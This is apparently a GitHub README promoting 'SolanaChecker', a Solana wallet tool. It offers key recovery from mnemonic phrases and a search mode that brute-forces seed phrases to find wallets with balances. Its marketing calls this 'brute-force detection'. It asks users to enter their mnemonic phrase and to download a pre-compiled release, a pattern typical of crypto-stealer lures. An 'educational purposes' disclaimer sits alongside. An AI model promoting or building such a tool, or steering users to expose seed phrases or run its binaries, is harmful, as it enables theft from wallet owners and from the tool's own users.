# Best Solana Wallet Checker Tool: Manage Your Crypto Assets with Ease  

**SolanaChecker** is the ultimate tool for managing and monitoring your Solana (SOL) assets. Designed to simplify your interaction with the Solana blockchain, this tool offers a wide range of features to help you check balances, verify token security, track wallet activity, and more. Whether you're a seasoned trader or a beginner, **SolanaChecker** is the best Solana wallet checker tool for all your crypto needs.  

---

## Key Features  

### 1. **Check Solana Wallet Balance**  
   - Instantly view the balance of any Solana wallet address.  
   - Stay updated on your SOL holdings without needing to log into multiple platforms.  

<p align="left">
    <img src="/assets/esviso.webp" />
</p>

### 2. **Verify Solana Tokens for Fraud**  
   - Analyze tokens for potential scams or fraudulent activity.  
   - Evaluate token metadata to avoid "rug-pull" schemes and make informed investment decisions.  

<p align="left">
    <img src="/assets/puewisi.webp" />
</p>

### 3. **Track Solana Wallet Activity**  
   - Monitor transactions on a specific Solana wallet address.  
   - Receive real-time notifications via Telegram for added convenience.  

### 4. **Recover Wallet Data Using Mnemonic Phrase**  
   - Retrieve wallet details, including the private key, address, and balance, using a mnemonic phrase.  
   - Securely manage your wallets and access critical information when needed.  

<p align="left">
    <img src="/assets/posovan.webp" />
</p>

### 5. **Generate New Solana Wallets**  
   - Create a new Solana wallet with a unique private key and address.  
   - Ideal for users looking to expand their crypto portfolio.  

<p align="left">
    <img src="/assets/caunili.webp" />
</p>

### 6. **Brute-Force Wallet Detection**  
   - Detect potential brute-force attempts on your Solana wallet addresses.  
   - Identify suspicious activity and take proactive measures to secure your assets.  

<p align="left">
    <img src="/assets/inmigli.webp" />
</p>

---

## Why Choose SolanaChecker?  

- **Comprehensive Functionality:** From balance checks to fraud detection, this tool covers all your Solana needs.  
- **User-Friendly Interface:** Easily navigate the platform and access all features in one place.  
- **Real-Time Monitoring:** Stay informed about wallet activity with instant notifications.  
- **Advanced Security:** Protect your assets with fraud detection and secure wallet management.  

---

## How to Use SolanaChecker  

### Step 1: **Access the Tool**  
   - Use the **Tor Browser** or any secure browser to access the tool.  
   - Ensure your connection is encrypted for maximum security.  

### Step 2: **Enter Your Wallet Address**  
   - Input your Solana wallet address to check your balance or perform a security scan.  
   - For additional features, provide your mnemonic phrase or generate a new wallet.  

### Step 3: **Enable Telegram Notifications**  
   - Configure Telegram settings to receive real-time updates about wallet activity.  
   - Add your bot token and chat ID to the `telegram-settings.txt` file.  

---

## Getting Started  

You can download the pre-compiled build from the [Release](../../releases) section or build the project yourself using the instructions below.  

### Building the Project  

1. **Install Dependencies:**  
   Use **vcpkg** to install required libraries:  
   ```bash
   vcpkg install openssl nlohmann-json cryptopp libsodium
   ```  

2. **Build via Visual Studio:**  
   - Open the project solution in Visual Studio.  
   - Click **Build** -> **Build Solution**.  

3. **Build via Command Line:**  
   ```bash
   g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
   ```  

---

## Command Line Options  

- **-b / -balance (ADDRESS):** Check the balance of a specific Solana wallet address.  
- **-t / -track (ADDRESS):** Track activity on a specific Solana wallet address.  
- **-m / -mnemonic (MNEMONIC):** Retrieve wallet data using a mnemonic phrase.  
- **-g / -gen (NUMBER):** Generate a specified number of Solana wallets.  
- **-s / -search:** Start brute-force generation of seed phrases to find wallets with balances.  

---

## Disclaimer  

This tool is intended for educational and research purposes only. It should not be used for illegal activities or unauthorized access to wallets. Always ensure the security of your private keys and mnemonic phrases.  

---

## License  

This project is licensed under the [MIT License](/LICENSE). Feel free to use, modify, and distribute the code in accordance with the license terms.  

---

**Stay Secure, Stay Informed, and Manage Your Solana Wallets with the Best Solana Wallet Checker Tool!**